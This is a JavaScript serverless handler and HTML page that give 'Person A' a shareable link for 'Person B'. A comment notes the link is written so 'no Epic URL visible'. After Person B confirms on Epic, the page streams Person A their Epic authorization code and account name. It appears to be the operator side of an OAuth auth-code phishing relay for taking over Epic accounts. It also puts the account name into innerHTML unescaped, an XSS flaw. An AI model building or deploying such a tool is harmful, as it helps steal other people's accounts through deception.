/**
 * GET /generate?discord_id=XXX
 *
 * Person A hits this. Gets back an HTML page that:
 *  1. Shows a unique shareable link to send to Person B
 *  2. Opens an SSE connection to /wait/:token
 *  3. When the code arrives via SSE, shows it instantly — no refresh needed
 *
 * The token is 32 hex chars, cryptographically random, single-use.
 */

import crypto from 'crypto';
import { createSession } from './_state.js';

export default function handler(req, res) {
  const discordId = String(req.query.discord_id || 'unknown').trim();
  const token = crypto.randomBytes(16).toString('hex'); // 32-char hex, unique per request
  const base = `https://${req.headers.host}`;

  createSession(token, discordId);

  // The link Person B will click — just /go/:token, no Epic URL visible
  const linkForB = `${base}/go/${token}`;
  const waitUrl  = `${base}/wait/${token}`;

  console.log(`[GENERATE] discord_id=${discordId} token=${token.slice(0,8)}... link=${linkForB}`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Epic Auth — Waiting</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #080808;
      color: #d0d0d0;
      font-family: -apple-system, 'Segoe UI', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
    .card {
      background: #101010;
      border: 1px solid #1e1e1e;
      border-radius: 20px;
      padding: 44px 40px;
      max-width: 520px;
      width: 100%;
    }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: #0e2a0e;
      border: 1px solid #1a4a1a;
      color: #00e676;
      font-size: 0.75em;
      font-weight: 600;
      padding: 4px 10px;
      border-radius: 20px;
      margin-bottom: 20px;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }
    .dot {
      width: 7px; height: 7px;
      background: #00e676;
      border-radius: 50%;
      animation: pulse 1.4s ease-in-out infinite;
    }
    @keyframes pulse {
      0%,100% { opacity: 1; transform: scale(1); }
      50%      { opacity: .4; transform: scale(.7); }
    }
    h1 { font-size: 1.45em; color: #fff; font-weight: 700; margin-bottom: 8px; }
    .sub { color: #555; font-size: 0.88em; line-height: 1.6; margin-bottom: 32px; }

    /* link box */
    .link-label { font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
    .link-row {
      display: flex;
      gap: 8px;
      background: #151515;
      border: 1px solid #252525;
      border-radius: 10px;
      padding: 12px 14px;
      margin-bottom: 28px;
      align-items: center;
    }
    .link-text {
      flex: 1;
      font-family: monospace;
      font-size: 0.85em;
      color: #00b4ff;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      cursor: pointer;
    }
    .copy-btn {
      background: #1e1e1e;
      border: 1px solid #2e2e2e;
      border-radius: 7px;
      color: #aaa;
      font-size: 0.78em;
      padding: 5px 12px;
      cursor: pointer;
      flex-shrink: 0;
      transition: all .15s;
    }
    .copy-btn:hover { border-color: #00e676; color: #00e676; }
    .copy-btn.copied { border-color: #00e676; color: #00e676; }

    /* status */
    .status-area { margin-bottom: 24px; }
    .status-row {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 13px 16px;
      border-radius: 10px;
      background: #0d0d0d;
      border: 1px solid #1a1a1a;
      font-size: 0.88em;
    }
    .status-row.waiting { border-color: #1a3a1a; }
    .status-row.success { border-color: #00e676; background: #071a07; }
    .status-row.error   { border-color: #3a1a1a; background: #1a0707; }
    .spinner {
      width: 16px; height: 16px;
      border: 2px solid #222;
      border-top-color: #00e676;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      flex-shrink: 0;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status-icon { font-size: 1.1em; flex-shrink: 0; }
    .status-text { color: #888; }
    .status-row.waiting .status-text { color: #00e676; }
    .status-row.success .status-text { color: #00e676; font-weight: 600; }
    .status-row.error   .status-text { color: #ff5252; }

    /* result */
    .result-area { display: none; }
    .result-area.show { display: block; }
    .result-label { font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
    .code-box {
      background: #071a07;
      border: 1px solid #00e676;
      border-radius: 10px;
      padding: 16px;
      font-family: monospace;
      font-size: 1.1em;
      color: #00e676;
      letter-spacing: .05em;
      word-break: break-all;
      margin-bottom: 10px;
    }
    .account-name {
      font-size: 0.85em;
      color: #555;
      margin-bottom: 20px;
    }
    .account-name span { color: #aaa; }

    /* retry */
    .retry-btn {
      display: none;
      width: 100%;
      background: #151515;
      border: 1px solid #252525;
      border-radius: 10px;
      color: #aaa;
      padding: 12px;
      font-size: 0.88em;
      cursor: pointer;
      margin-top: 8px;
      transition: all .15s;
    }
    .retry-btn:hover { border-color: #555; color: #ddd; }
    .retry-btn.show { display: block; }

    /* steps */
    .steps { margin-top: 28px; border-top: 1px solid #161616; padding-top: 20px; }
    .step { display: flex; gap: 12px; margin-bottom: 12px; align-items: flex-start; }
    .step-num {
      width: 22px; height: 22px;
      border-radius: 50%;
      background: #1a1a1a;
      color: #555;
      font-size: 0.75em;
      font-weight: 700;
      display: flex; align-items: center; justify-content: center;
      flex-shrink: 0;
      margin-top: 1px;
    }
    .step-num.done { background: #0e2a0e; color: #00e676; }
    .step-txt { font-size: 0.83em; color: #444; line-height: 1.5; }
    .step-txt.active { color: #888; }
    .step-txt.done   { color: #555; text-decoration: line-through; }

    .token-hint { font-size: 0.72em; color: #2a2a2a; margin-top: 24px; text-align: center; }
  </style>
</head>
<body>
<div class="card">
  <div class="badge"><div class="dot"></div>Live Session</div>
  <h1>Waiting for Epic Auth</h1>
  <p class="sub">Send the link below to the person who needs to link their Epic account. When they click it and confirm on Epic, the auth code appears here automatically.</p>

  <div class="link-label">Share this link with the user</div>
  <div class="link-row">
    <span class="link-text" id="linkText" title="${linkForB}">${linkForB}</span>
    <button class="copy-btn" id="copyBtn" onclick="copyLink()">Copy</button>
  </div>

  <div class="status-area">
    <div class="status-row waiting" id="statusRow">
      <div class="spinner" id="spinner"></div>
      <span class="status-text" id="statusText">Waiting for user to click the link…</span>
    </div>
  </div>

  <div class="result-area" id="resultArea">
    <div class="result-label">Authorization Code</div>
    <div class="code-box" id="codeBox"></div>
    <div class="account-name" id="accountName"></div>
  </div>

  <button class="retry-btn" id="retryBtn" onclick="reconnect()">↺ Reconnect</button>

  <div class="steps">
    <div class="step">
      <div class="step-num done">✓</div>
      <div class="step-txt done">Link generated — share it with the user</div>
    </div>
    <div class="step" id="step2">
      <div class="step-num" id="step2num">2</div>
      <div class="step-txt active" id="step2txt">User clicks the link on their PC (any network)</div>
    </div>
    <div class="step" id="step3">
      <div class="step-num" id="step3num">3</div>
      <div class="step-txt" id="step3txt">Epic confirms → code delivered here automatically</div>
    </div>
  </div>

  <div class="token-hint">Session token: ${token.slice(0,8)}… · expires in 10 min</div>
</div>

<script>
const WAIT_URL   = '${waitUrl}';
const LINK       = '${linkForB}';
let   evtSource  = null;
let   connected  = false;

function setStatus(text, type = 'waiting') {
  const row = document.getElementById('statusRow');
  const sp  = document.getElementById('spinner');
  const txt = document.getElementById('statusText');
  row.className = 'status-row ' + type;
  txt.textContent = text;
  sp.style.display = (type === 'waiting') ? 'block' : 'none';
}

function markStep(n, state) {
  const num = document.getElementById('step' + n + 'num');
  const txt = document.getElementById('step' + n + 'txt');
  if (state === 'done')   { num.className = 'step-num done'; num.textContent = '✓'; txt.className = 'step-txt done'; }
  if (state === 'active') { num.style.background = '#0e2a0e'; num.style.color = '#00e676'; txt.className = 'step-txt active'; }
}

function connect() {
  if (evtSource) evtSource.close();
  document.getElementById('retryBtn').className = 'retry-btn';

  evtSource = new EventSource(WAIT_URL);

  evtSource.addEventListener('open', () => {
    connected = true;
    setStatus('Connected — waiting for user to click the link…', 'waiting');
    console.log('[SSE] connected');
  });

  evtSource.addEventListener('ping', () => {
    /* keepalive — ignore */
  });

  evtSource.addEventListener('clicked', () => {
    setStatus('User opened the link — waiting for Epic confirmation…', 'waiting');
    markStep(2, 'done');
    markStep(3, 'active');
    console.log('[SSE] clicked');
  });

  evtSource.addEventListener('code', (e) => {
    evtSource.close();
    const data = JSON.parse(e.data);
    const code = data.code;

    setStatus('✅ Auth code received!', 'success');
    markStep(2, 'done');
    markStep(3, 'done');

    // Show the code
    document.getElementById('codeBox').textContent = code;
    if (data.displayName) {
      document.getElementById('accountName').innerHTML =
        'Epic account: <span>' + data.displayName + '</span>';
    }
    document.getElementById('resultArea').className = 'result-area show';
    console.log('[SSE] code received:', code);
  });

  evtSource.addEventListener('error', (e) => {
    evtSource.close();
    connected = false;
    setStatus('Connection lost — click Reconnect', 'error');
    document.getElementById('retryBtn').className = 'retry-btn show';
    console.warn('[SSE] error/closed');
  });
}

function reconnect() {
  setStatus('Reconnecting…', 'waiting');
  connect();
}

function copyLink() {
  navigator.clipboard.writeText(LINK).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.textContent = 'Copied!';
    btn.className = 'copy-btn copied';
    setTimeout(() => { btn.textContent = 'Copy'; btn.className = 'copy-btn'; }, 2000);
  });
}

// Start SSE on load
connect();
</script>
</body>
</html>`);
}
